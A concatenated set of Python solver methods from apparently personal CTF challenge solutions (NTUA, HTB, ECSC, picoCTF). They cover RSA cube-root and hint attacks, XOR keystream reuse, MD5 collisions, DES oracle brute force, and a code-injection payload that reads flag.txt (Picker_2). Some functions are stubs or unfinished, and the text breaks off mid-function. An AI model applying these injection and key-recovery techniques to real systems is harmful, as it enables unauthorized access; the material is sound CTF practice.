        return bytes(x ^ y for x, y in zip(a, b))

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Secure_Encryption_Service/payloads/solution.py
    def solve(self):
        pass

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Secure_Encryption_Service/payloads/solution.py
    def main(self):

        conn_1 = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )

        conn_2 = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )

        # For the local connection, we need to edit the server.py file
        conn_1.challenge_file = self.Path(self.folders[&#34;data&#34;], &#34;edited_server.py&#34;)
        conn_2.challenge_file = self.Path(self.folders[&#34;data&#34;], &#34;edited_server.py&#34;)

        # Initialize the connection on both
        conn_1.initiate_connection()
        conn_2.initiate_connection()

        conn_1.recv_send(text_until=&#34;&gt; &#34;, text=&#34;1&#34;)
        encflag = conn_1.recv_lines(1, save=True)[0].decode().strip()
        encflag = bytes.fromhex(encflag)

        conn_2.recv_send(text_until=&#34;&gt; &#34;, text=&#34;2&#34;)
        conn_2.recv_send(text_until=&#34;: &#34;, text=&#34;00&#34; * len(encflag))

        xor_with_this = conn_2.recv_lines(1, save=True)[0].decode().strip()

        xor_with_this = bytes.fromhex(xor_with_this)

        print(self.pwn.xor(xor_with_this, encflag))

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Megalh_padata/payloads/solution.py
    def xor(self, a, b):
        return bytes(
            [a[i % len(a)] ^ b[i % len(b)] for i in range(max(len(a), len(b)))]
        )

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Megalh_padata/payloads/solution.py
    def open_file(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            data = f.read().split(&#34;\n&#34;)
            n = int(data[0].split(&#34;= &#34;)[1])
            enc_flag = data[1].split(&#34;= &#34;)[1]
            c = data[2].split(&#34;= &#34;)[1]
        return n, enc_flag, c

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Megalh_padata/payloads/solution.py
    def main(self):

        n, enc_flag, c = self.open_file()

        m = b&#34;1337&#34;

        c_rsa = pow(bytes_to_long(m), 3, n)

        otp = self.xor(long_to_bytes(c_rsa), bytes.fromhex(c))

        rsa_flag = self.xor(bytes.fromhex(enc_flag), otp)[:-5]

        m, _ = iroot(bytes_to_long(rsa_flag), 3)
        m = long_to_bytes(m)
        print(m)

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Missing_Reindeer/payloads/solution.py
    def main(self):
        self.key = &#34;&#34;
        key_pub = self.Path(self.folder_files, &#34;key.pub&#34;)
        with open(key_pub, &#34;r&#34;) as f:
            self.key = RSA.importKey(f.read())
        self.n = self.key.n
        self.e = self.key.e

        self.crypted = b&#34;Ci95oTkIL85VWrJLVhns1O2vyBeCd0weKp9o3dSY7hQl7CyiIB/D3HaXQ619k0+4FxkVEksPL6j3wLp8HMJAPxeA321RZexR9qwswQv2S6xQ3QFJi6sgvxkN0YnXtLKRYHQ3te1Nzo53gDnbvuR6zWV8fdlOcBoHtKXlVlsqODku2GvkTQ/06x8zOAWgQCKj78V2mkPiSSXf2/qfDp+FEalbOJlILsZMe3NdgjvohpJHN3O5hLfBPdod2v6iSeNxl7eVcpNtwjkhjzUx35SScJDzKuvAv+6DupMrVSLUfcWyvYUyd/l4v01w+8wvPH9l&#34;

        self.msg = bytes_to_long(b64decode(self.crypted))

        cleartext = self.find_invpow(self.msg, 3)
        cleartext = long_to_bytes(int(cleartext))

        print(cleartext)

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Missing_Reindeer/payloads/solution.py
    def find_invpow(self, x, n):
        &#34;&#34;&#34;Finds the integer component of the n&#39;th root of x,
        an integer such that y ** n &lt;= x &lt; (y + 1) ** n.
        &#34;&#34;&#34;
        high = 1
        while high**n &lt; x:
            high *= 2
        low = high // 2
        while low &lt; high:
            mid = (low + high) // 2
            if low &lt; mid and mid**n &lt; x:
                low = mid
            elif high &gt; mid and mid**n &gt; x:
                high = mid
            else:
                return mid
        return mid + 1

        # /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def md5_hash(self, s):
        return md5(s.encode()).hexdigest()

        # /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def find_collision(
        self, target_hash, max_length=10, prefix=&#34;&#34;, suffix=&#34;&#34;, lengthy=False
    ):
        # Define the character set to use for generating combinations
        charset = (
            string.ascii_letters + string.digits
        )  # You can add special characters if needed

        if lengthy:
            for length in range(1, max_length + 1):
                for combination in itertools.product(charset, repeat=length):
                    candidate = prefix + &#34;&#34;.join(combination) + suffix
                    print(candidate, self.md5_hash(candidate), self.target_hash)

                    if self.md5_hash(candidate) == target_hash:
                        return candidate
        else:
            # Iterate over lengths from 1 to max_length
            for combination in itertools.product(
                charset, repeat=max_length - len(prefix) - len(suffix)
            ):
                candidate = prefix + &#34;&#34;.join(combination) + suffix
                print(candidate, self.md5_hash(candidate), self.target_hash)
                if self.md5_hash(candidate) == target_hash:
                    return candidate
        return None

        # /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def bruteforce(self):
        self.users = {
            &#34;HTBUser132&#34;: [md5(b&#34;HTBUser132&#34;).hexdigest(), &#34;secure123!&#34;],
            &#34;JohnMarcus&#34;: [md5(b&#34;JohnMarcus&#34;).hexdigest(), &#34;0123456789&#34;],
        }

        # The target hash for &#34;HTBUser 132&#34;
        self.target_hash = self.md5_hash(&#34;HTBUser132&#34;)

        self.collision = self.find_collision(
            self.target_hash,
            max_length=len(&#34;HTBUser132&#34;),
            prefix=&#34;&#34;,
            suffix=&#34;&#34;,
            lengthy=True,
        )
        print(
            f&#34;Found collision: {self.collision} with hash: {self.md5_hash(self.collision)}&#34;
        )

        # /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def known_colissions(self):
        one = {
            &#34;username&#34;: &#34;TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&#34;,
            &#34;password&#34;: &#34;verysecure&#34;,
        }
        two = {
            &#34;username&#34;: &#34;TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&#34;,
            &#34;password&#34;: &#34;verysecure&#34;,
        }

        print(f&#34;Hash one: {self.md5_hash(one[&#39;username&#39;])}&#34;)
        print(f&#34;Hash two: {self.md5_hash(two[&#39;username&#39;])}&#34;)

        # /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def main(self):
        # self.bruteforce()
        self.known_colissions()

        # /home/figaro/CTF/Categories/Cryptography/HTB/MuTLock/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Cryptography/HTB/sugar_free_candies/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.v1 = 4196604293528562019178729176959696479940189487937638820300425092623669070870963842968690664766177268414970591786532318240478088400508536
        self.v2 = 11553755018372917030893247277947844502733193007054515695939193023629350385471097895533448484666684220755712537476486600303519342608532236
        self.v3 = 14943875659428467087081841480998474044007665197104764079769879270204055794811591927815227928936527971132575961879124968229204795457570030
        self.v4 = 6336816260107995932250378492551290960420748628

        # /home/figaro/CTF/Categories/Cryptography/HTB/sugar_free_candies/payloads/solution.py
    def solve_equations(self):
        self.cnd1, self.cnd2, self.cnd3 = symbols(&#34;cnd1 cnd2 cnd3&#34;)

        # Define the equations
        eq1 = Eq(self.cnd1**3 + self.cnd3**2 + self.cnd2, self.v1)
        eq2 = Eq(self.cnd2**3 + self.cnd1**2 + self.cnd3, self.v2)
        eq3 = Eq(self.cnd3**3 + self.cnd2**2 + self.cnd1, self.v3)
        eq4 = Eq(self.cnd1 + self.cnd2 + self.cnd3, self.v4)

        solution = solve((eq1, eq2, eq3, eq4), (self.cnd1, self.cnd2, self.cnd3))
        return solution

        # /home/figaro/CTF/Categories/Cryptography/HTB/sugar_free_candies/payloads/solution.py
    def main(self):
        solution = self.solve_equations()

        # Check if the solution is valid
        if isinstance(solution, list) and len(solution) &gt; 0:
            # Assuming the first solution is the desired one
            sol = solution[0]
            print(&#34;cnd1:&#34;, sol[self.cnd1])
            print(&#34;cnd2:&#34;, sol[self.cnd2])
            print(&#34;cnd3:&#34;, sol[self.cnd3])

        # /home/figaro/CTF/Categories/Cryptography/HTB/sekur_julius/payloads/solution.py
    def juilius_decrypt(self, msg, shift):
        pt = &#34;&#34;
        for c in msg:
            if c == &#34;0&#34;:
                pt += &#34; &#34;
            elif not ord(&#34;A&#34;) &lt;= ord(c) &lt;= ord(&#34;Z&#34;):
                pt += c
            else:
                o = ord(c) - 65
                pt += chr(65 + (o - shift) % 26)
        return pt

        # /home/figaro/CTF/Categories/Cryptography/HTB/sekur_julius/payloads/solution.py
    def brute_force(self, encrypted_data):

        for shift in range(27):
            pt = self.juilius_decrypt(encrypted_data, shift)
            if &#34;HTB&#34; in pt:
                return pt

        # /home/figaro/CTF/Categories/Cryptography/HTB/sekur_julius/payloads/solution.py
    def main(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            encrypted_data = f.read().strip()

        decrypted_data = self.brute_force(encrypted_data)
        print(decrypted_data)

        # /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/solution.py
    def get_output_variables(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            self.variables = {
                line.split(&#34; = &#34;)[0]: int(line.strip(&#34;\n&#34;).split(&#34; = &#34;)[1])
                for line in f
            }

        # /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/solution.py
    def main(self):
        self.get_output_variables()
        rx = re.compile(r&#34;(\w+)\s*=\s*(\d+)&#34;)

        ct = self.variables[&#34;ct&#34;]
        hint = self.variables[&#34;hint&#34;]
        n = self.variables[&#34;n&#34;]
        e = self.variables[&#34;e&#34;]

        P = symbols(&#34;P&#34;)
        phi_expr = lambda p: n + 1 - p - n // p  # symbolic (n)  (works in Z)
        start = 103000
        message = &#34;&#34;
        for k in range(start, e):
            print(f&#34;I - {k} | m: {message}&#34;)

            # build F_k(p) with the trick explained above
            Y = k * (n + 1 - P) + 1  # k(n+1-p) + 1   (first part)
            Fk = (
                (Y - k * n / P) ** 2 * P**4
                - hint * e * e * P**3
                + (k * k * n * n + e**4 * n) * P**2
            )
            poly = Poly(Fk.expand() * P**0, P)  # canonical form, ZZ [x]

            # try to pull out linear factors
            for factor, _ in poly.factor_list()[1]:
                if factor.degree() != 1:  # need a root of degree-1
                    message = &#34;prev continued&#34;
                    continue
                root = -factor.all_coeffs()[-1] // factor.all_coeffs()[0]

                if root &gt; 1 and n % root == 0:  # bingo  we have   p
                    p = int(root)
                    q = n // p
                    phi = (p - 1) * (q - 1)
                    d = gmpy2.invert(e, phi)  # private exponent
                    m = pow(ct, d, n)
                    flag = gmpy2.to_binary(m).rstrip(b&#34;\x00&#34;)
                    print(f&#34;[+] k   = {k}&#34;)
                    print(f&#34;[+] p   = {p}&#34;)
                    print(f&#34;[+] q   = {q}&#34;)
                    print(f&#34;[+] d   = {d}&#34;)
                    print(f&#34;[+] flag = {flag.decode(errors=&#39;ignore&#39;)}&#34;)
                    sys.exit(0)
                message = &#34;&#34;

        # /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/attempt_01.py
    def get_output_variables(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            self.variables = {
                line.split(&#34; = &#34;)[0]: int(line.strip(&#34;\n&#34;).split(&#34; = &#34;)[1])
                for line in f
            }

        # /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/attempt_01.py
    def main(self):
        self.get_output_variables()
        # self.variables
        # Let p be unknown. Use:
        # hint = d^2 * p + e^2 * q
        # n = p * q  q = n // p
        # Substitute and solve: hint = d^2 * p + e^2 * (n // p)
        # This turns into: hint = A*p + B*(n//p)

        # We can brute force small `e` (22 bits), so d is not that large.
        ct = self.variables[&#34;ct&#34;]
        hint = self.variables[&#34;hint&#34;]
        n = self.variables[&#34;n&#34;]
        e = self.variables[&#34;e&#34;]

        found = False
        for possible_d in range(1, 1 &lt;&lt; 22):
            A = possible_d**2
            B = e**2
            numerator = hint - B * n
            denominator = A - B

            if denominator == 0:
                continue

            if numerator % denominator != 0:
                continue

            p_candidate = numerator // denominator
            if n % p_candidate != 0:
                continue

            q_candidate = n // p_candidate

            if isPrime(p_candidate) and isPrime(q_candidate):
                p = p_candidate
                q = q_candidate
                d = possible_d
                found = True
                print(f&#34;[+] Found p and q using d = {d}&#34;)
                break

        if not found:
            print(&#34;[-] Failed to find valid p and q&#34;)
            return  # or: raise Exception(&#34;Failed to find primes&#34;)

        # Continue only if found
        phi = (p - 1) * (q - 1)
        d = inverse(e, phi)

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def des_key_generator(self):
        &#34;&#34;&#34;
        Generator for all possible 8-byte DES keys.
        DES uses a 56-bit key space, padded to 8 bytes.
        &#34;&#34;&#34;
        for key in range(2**64):
            # Convert the 56-bit key to an 8-byte key
            key_bytes = key.to_bytes(8, byteorder=&#34;big&#34;)
            yield key_bytes

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def oracle_encrypt(self, pt_hex):
        self.recv_send(text=&#34;1&#34;, text_until=&#34;&gt; &#34;)
        self.recv_send(
            text=pt_hex,
            text_until=&#34;Provide message to encrypt &gt; &#34;,
        )
        encrypted_pt = self.recv_lines(1, save=True)[0]
        return bytes.fromhex(encrypted_pt.strip().decode())

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def menu_handler(self, verbose=False):
        for pt in self.plaintexts:
            ct = self.oracle_encrypt(pt.hex())
            if verbose:
                print(f&#34;Encrypting plaintext: {pt.hex()} - ciphertext: {ct.hex()}&#34;)
            self.pairs.append((pt, ct))

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def try_key(self, key_bytes):
        key = des.DesKey(key_bytes)
        for pt, ct in self.pairs:
            if key.encrypt(pt) != ct:
                return False
        return True

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def bruteforce_key(self, verbose=False):
        found_key = None
        for key_canditate in itertools.product(range(256), repeat=8):
            if verbose:
                print(f&#34;Trying key: {bytes(key_canditate).hex()}&#34;)
            key_bytes = bytes(key_canditate)
            if self.try_key(key_bytes):
                found_key = key_bytes
                print(&#34;Key found:&#34;, found_key.hex())
                break
        return found_key

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def bruteforce_key_multiprocessing(self, verbose=False):
        &#34;&#34;&#34;
        Multiprocessing brute-force key search.
        &#34;&#34;&#34;
        found_key = None

        with Pool(processes=cpu_count() - 8) as pool:
            key_candidates = itertools.product(range(256), repeat=8)
            # Pass both key candidates and pairs to the worker
            args = ((key_candidate, self.pairs) for key_candidate in key_candidates)
            for result in pool.imap(worker, args):
                if result:
                    found_key = result
                    print(&#34;Key found:&#34;, found_key.hex())
                    pool.terminate()  # Stop other processes
                    break

        return found_key

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def main(self):

        # 50 unique 8-byte blocks
        self.plaintexts = [bytes([i]) * 8 for i in range(49)]
        self.pairs = []

        self.initiate_connection()
        self.recv_lines(3)

        self.menu_handler(verbose=True)

        found_key = self.bruteforce_key_multiprocessing(verbose=True)
        if not found_key:
            print(&#34;Key not found. Try optimizing or using more pairs.&#34;)
            return

        # Encrypt the magic phrase
        magic_pt = b&#34;Give me the flag&#34;
        key = des.DesKey(found_key)
        magic_ct = key.encrypt(magic_pt)
        print(&#34;Magic ciphertext:&#34;, magic_ct.hex())

        self.recv_send(text=&#34;2&#34;, text_until=&#34;&gt; &#34;)
        self.recv_send(text=magic_ct.hex(), text_until=&#34;Provide the magic phrase &gt; &#34;)
        flag = self.recv_lines(3, display=True, save=True)[0]

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def des_key_generator(self):
        &#34;&#34;&#34;
        Generator for all possible 8-byte DES keys.
        DES uses a 56-bit key space, padded to 8 bytes.
        &#34;&#34;&#34;
        for key in range(2**64):
            # Convert the 56-bit key to an 8-byte key
            key_bytes = key.to_bytes(8, byteorder=&#34;big&#34;)
            yield key_bytes

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def oracle_encrypt(self, pt_hex):
        self.recv_send(text=&#34;1&#34;, text_until=&#34;&gt; &#34;)
        self.recv_send(
            text=pt_hex,
            text_until=&#34;Provide message to encrypt &gt; &#34;,
        )
        encrypted_pt = self.recv_lines(1, save=True)[0]
        return bytes.fromhex(encrypted_pt.strip().decode())

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def menu_handler(self, verbose=False):
        for pt in self.plaintexts:
            ct = self.oracle_encrypt(pt.hex())
            if verbose:
                print(f&#34;Encrypting plaintext: {pt.hex()} - ciphertext: {ct.hex()}&#34;)
            self.pairs.append((pt, ct))

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def try_key(self, key_bytes):
        key = des.DesKey(key_bytes)
        for pt, ct in self.pairs:
            if key.encrypt(pt) != ct:
                return False
        return True

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def bruteforce_key(self, verbose=False):
        found_key = None
        for key_canditate in itertools.product(range(256), repeat=8):
            if verbose:
                print(f&#34;Trying key: {bytes(key_canditate).hex()}&#34;)
            key_bytes = bytes(key_canditate)
            if self.try_key(key_bytes):
                found_key = key_bytes
                print(&#34;Key found:&#34;, found_key.hex())
                break
        return found_key

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def bruteforce_key_multiprocessing(self, verbose=False):
        &#34;&#34;&#34;
        Multiprocessing brute-force key search.
        &#34;&#34;&#34;
        found_key = None

        with Pool(processes=cpu_count() - 8) as pool:
            key_candidates = itertools.product(range(256), repeat=8)
            # Pass both key candidates and pairs to the worker
            args = ((key_candidate, self.pairs) for key_candidate in key_candidates)
            for result in pool.imap(worker, args):
                if result:
                    found_key = result
                    print(&#34;Key found:&#34;, found_key.hex())
                    pool.terminate()  # Stop other processes
                    break

        return found_key

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def main_multi_process(self):

        # 50 unique 8-byte blocks
        self.plaintexts = [bytes([i]) * 8 for i in range(49)]
        self.pairs = []

        self.initiate_connection()
        self.recv_lines(3)

        self.menu_handler(verbose=True)

        found_key = None
        # Needs the logic here

        # Encrypt the magic phrase
        magic_pt = b&#34;Give me the flag&#34;
        key = des.DesKey(found_key)
        magic_ct = key.encrypt(magic_pt)
        print(&#34;Magic ciphertext:&#34;, magic_ct.hex())

        self.recv_send(text=&#34;2&#34;, text_until=&#34;&gt; &#34;)
        self.recv_send(text=magic_ct.hex(), text_until=&#34;Provide the magic phrase &gt; &#34;)
        flag = self.recv_lines(3, display=True, save=True)[0]

        # /home/figaro/CTF/Categories/Cryptography/ECSC/Gamble_Auction/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def main(self):

        with open(self.challenge_file, &#34;r&#34;) as f:
            data = f.read()

        # alphabet = ascii_lowercase + ascii_uppercase + digits

        crypted_alphabet = set()
        for c in data:
            crypted_alphabet.add(c)

        crypted_dict = {c: &#34;&#34; for c in sorted(list(crypted_alphabet))}

        # self.saving_to_json(crypted_dict)

        crypted_dict = self.read_json(&#34;table.json&#34;)

        for i, v in enumerate(crypted_dict):
            print(i + 2, v, crypted_dict[v])

        print(self.decoding(crypted_dict, data))

        # /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def decoding(self, crypted_dict, data):

        decoded = &#34;&#34;
        for c in data:
            if c in crypted_dict.keys() and crypted_dict[c] != &#34;&#34;:
                decoded += crypted_dict[c]
            else:
                decoded += c
        return decoded

        # /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def saving_to_json(self, crypted_dict):

        self.folfil(&#34;data&#34;, &#34;table.json&#34;)

        with open(self.folfil(&#34;data&#34;, &#34;table.json&#34;), &#34;w&#34;) as f:
            json.dump(crypted_dict, f, indent=4)

        # /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def read_json(self, filename):
        with open(self.folfil(&#34;data&#34;, filename), &#34;r&#34;) as f:
            return json.load(f)

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Classic_Crackme_0x100/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_1/payloads/solution.py
    def de_hexing_flag(self, flag):
        flag = flag[0].decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).strip(&#34; &#34;)
        flag = [chr(int(letter, 16)) for letter in flag.split(&#34; &#34;)]
        flag = &#34;&#34;.join(flag)
        return flag

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_1/payloads/solution.py
    def main(self):
        self.initiate_connection()
        self.menu_num = 1
        self.menu_text = &#34;==&gt; &#34;
        self.send_menu(choice=&#34;win&#34;, display=False)
        flag = self.recv_menu(number=1, display=False, save=True)

        flag = self.de_hexing_flag(flag)
        print(flag)

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_2/payloads/solution.py
    def main(self):
        payload = &#34;print(open(&#39;flag.txt&#39;,&#39;r&#39;).read())#&#34;
        self.initiate_connection()
        self.menu_num = 0
        self.menu_text = &#34;==&gt; &#34;
        self.send_menu(choice=payload, display=True)
        flag = self.recv_menu(number=1, display=True, save=True)[0]
        print(flag)

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.menu_num = 0
        self.menu_text = &#34;==&gt; &#34;
        self.local_preparations()
        self.initiate_connection()
        self.help_num = 13

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def local_preparations(self):
        if self.conn == &#34;remote&#34;:
            return
        self.challenge_file = self.Path(self.parent, &#34;challenge&#34;, self.file)
        self.folder_challenge = self.Path(self.parent, &#34;challenge&#34;)
        self.prepare_space(
            files=[&#34;flag.txt&#34;],
            folder=self.folder_challenge,
        )

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def de_hexing_flag(self, flag):
        flag = flag[0].decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).strip(&#34; &#34;)
        flag = [chr(int(letter, 16)) for letter in flag.split(&#34; &#34;)]
        flag = &#34;&#34;.join(flag)
        return flag

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def main(self):

        # This was useless to get the func tables and stuff

        # self.send_menu(choice=2)
        # self.conn.recvuntil(&#34;Please enter variable name to read: &#34;.encode())
        # self.conn.sendline(&#34;FUNC_TABLE_SIZE&#34;.encode())
        # FUNC_TABLE_SIZE = self.recv_menu(number=1, display=True, save=True)[0]

        # self.send_menu(choice=2)
        # self.conn.recvuntil(&#34;Please enter variable name to read: &#34;.encode())
        # self.conn.sendline(&#34;FUNC_TABLE_ENTRY_SIZE&#34;.encode())
        # FUNC_TABLE_ENTRY_SIZE = self.recv_menu(number=1, display=True, save=True)[0]

        # FUNC_TABLE_SIZE = int(FUNC_TABLE_SIZE.decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).strip(&#34; &#34;))
        # FUNC_TABLE_ENTRY_SIZE = int(
        #     FUNC_TABLE_ENTRY_SIZE.decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).strip(&#34; &#34;)
        # )

        new_func_table = &#39;&#34;{0:128}&#34;&#39;.format(&#34;win&#34;)
        self.send_menu(choice=3)

        self.conn.recvuntil(&#34;Please enter variable name to write: &#34;.encode())
        self.conn.sendline(&#34;func_table&#34;.encode())

        self.conn.recvuntil(&#34;Please enter new value of variable: &#34;.encode())
        self.conn.sendline(new_func_table.encode())

        # Access the first option of the table
        self.send_menu(choice=1)

        flag = self.recv_menu(number=1, display=True, save=True)
        flag = self.de_hexing_flag(flag)
        print(flag)

        self.conn.sendline(&#34;quit&#34;.encode())

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/keygenme-py/payloads/solution.py
    def main(self):

        username_trial = &#34;PRITCHARD&#34;
        bUsername_trial = b&#34;PRITCHARD&#34;

        key_part_static1_trial = &#34;picoCTF{1n_7h3_|&lt;3y_of_&#34;
        key_part_dynamic1_trial = &#34;xxxxxxxx&#34;
        key_part_static2_trial = &#34;}&#34;

        # I used bUsername_trial because enter_liscence used it as well but after testing afterwards, they output the same answer
        middle_flag = [
            hashlib.sha256(bUsername_trial).hexdigest()[4],
            hashlib.sha256(bUsername_trial).hexdigest()[5],
            hashlib.sha256(bUsername_trial).hexdigest()[3],
            hashlib.sha256(bUsername_trial).hexdigest()[6],
            hashlib.sha256(bUsername_trial).hexdigest()[2],
            hashlib.sha256(bUsername_trial).hexdigest()[7],
            hashlib.sha256(bUsername_trial).hexdigest()[1],
            hashlib.sha256(bUsername_trial).hexdigest()[8],
        ]

        key_part_dynamic1_trial = &#34;&#34;.join(middle_flag)
        key_full_template_trial = (
            key_part_static1_trial + key_part_dynamic1_trial + key_part_static2_trial
        )

        print(key_full_template_trial)

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def bytes_to_int_array(self, data):
        &#34;&#34;&#34;Convert bytes to array of integers&#34;&#34;&#34;
        return [b for b in data]

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def int_array_to_bytes(self, data):
        &#34;&#34;&#34;Convert array of integers to bytes&#34;&#34;&#34;
        return bytes(data)

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def xor_decrypt(self, encrypted, key):
        &#34;&#34;&#34;Perform XOR decryption similar to FUN_00101189&#34;&#34;&#34;
        if not key:
            return b&#34;&#34;

        result = []
        key_len = len(key)

        for i in range(len(encrypted)):
            result.append(encrypted[i] ^ key[i % key_len])

        return bytes(result)

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def hex_to_bytes_le(self, hex_val, size):
        return hex_val.to_bytes(size, &#34;little&#34;)

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def solve_challenge(self):
        &#34;&#34;&#34;Main function to solve the challenge&#34;&#34;&#34;

        # Extract the encrypted data from the decompiled code (little-endian format)
        # Convert hex values to bytes in little-endian order

        # Stage 1 data from local_258, local_250, local_248, local_240, local_238
        encrypted_stage1 = (
            self.hex_to_bytes_le(0x59E9BA9E8F463D01, 8)
            + self.hex_to_bytes_le(0x5B94C9EA56CFFF4F, 8)
            + self.hex_to_bytes_le(0xC1129B387F683E5, 8)
            + self.hex_to_bytes_le(0xC19D94E581D7E07A, 8)
            + self.hex_to_bytes_le(0x2D2E57E4, 4)
        )

        # Stage 2 data from local_228, local_220, local_218, local_210, local_208
        encrypted_stage2 = (
            self.hex_to_bytes_le(0x4E9EF0D5EA375C64, 8)
            + self.hex_to_bytes_le(0x48E7DEA62BDB901D, 8)
            + self.hex_to_bytes_le(0x5A4654DEE5B1D698, 8)
            + self.hex_to_bytes_le(0x8D8E95F2979D8315, 8)
            + self.hex_to_bytes_le(0x703F1481, 4)
        )

        print(&#34;[*] Attempting to recover the key...&#34;)
        print(f&#34;[*] Stage 1 encrypted data length: {len(encrypted_stage1)}&#34;)
        print(f&#34;[*] Stage 2 encrypted data length: {len(encrypted_stage2)}&#34;)

        # Try common flag prefixes (focusing on ECSC format)
        common_prefixes = [b&#34;ECSC{&#34;, b&#34;ecsc{&#34;]

        for prefix in common_prefixes:
            print(f&#34;\n[*] Trying prefix: {prefix.decode()}&#34;)

            # Try different key lengths (minimum 5 as per the code)
            for key_length in range(5, 21):
                print(f&#34;[*] Trying key length: {key_length}&#34;)

                # Try to find a key that produces the expected prefix
                # We&#39;ll try a brute force approach for short keys
                if key_length &lt;= 8:
                    # For short keys, try common patterns
                    test_keys = [
                        b&#34;hello&#34; + b&#34;a&#34; * (key_length - 5),
                        b&#34;password&#34;[:key_length],
                        b&#34;12345&#34; + b&#34;a&#34; * (key_length - 5),
                        b&#34;admin&#34; + b&#34;a&#34; * (key_length - 5),
                        b&#34;key12&#34; + b&#34;a&#34; * (key_length - 5),
                        b&#34;test1&#34; + b&#34;a&#34; * (key_length - 5),
                    ]

                    for test_key in test_keys:
                        if len(test_key) != key_length:
                            continue

                        # First decrypt stage 1 with the test key
                        stage1_result = self.xor_decrypt(encrypted_stage1, test_key)

                        # Then decrypt stage 2 with stage 1 result
                        final_result = self.xor_decrypt(encrypted_stage2, stage1_result)

                        # Check if result starts with expected prefix
                        if final_result.startswith(prefix):
                            print(f&#34;[+] FOUND POTENTIAL KEY: {test_key}&#34;)
                            print(f&#34;[+] Decrypted flag: {final_result}&#34;)
                            return test_key, final_result

        # If simple brute force doesn&#39;t work, try reverse engineering approach
        print(&#34;\n[*] Simple brute force failed. Trying reverse engineering approach...&#34;)

        # Assume the flag starts with &#34;ECSC{&#34; and try to work backwards
        target_prefix = b&#34;ECSC{&#34;

        # Try to find what stage1_result should be to produce target_prefix
        for key_len in range(5, 16):
